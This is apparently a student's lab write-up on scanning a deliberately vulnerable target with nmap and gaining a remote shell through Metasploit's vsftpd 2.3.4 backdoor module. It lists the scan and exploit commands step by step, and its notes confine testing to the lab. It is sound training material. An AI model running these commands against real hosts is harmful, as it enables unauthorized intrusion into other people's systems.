# Week 5 – Recon and exploit lab

Summary
Used nmap and Metasploit against a deliberately vulnerable target running inside a local lab environment.

Tools used
docker, nmap, msfconsole

Lab setup
- Local Docker container for a vulnerable VM
- A separate shell for the host VM

Recon
nmap -p0-65535 <target_ip>
nmap <target_ip> --script vuln -p 21

Exploit
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target_ip>
run

Proof
- lsb_release and ifconfig inside the remote shell

Screenshots
Place here: screenshots/nmap.png and screenshots/msf_success.png

Notes
- Restrict tests to the lab target only
- Do not scan external networks without permission
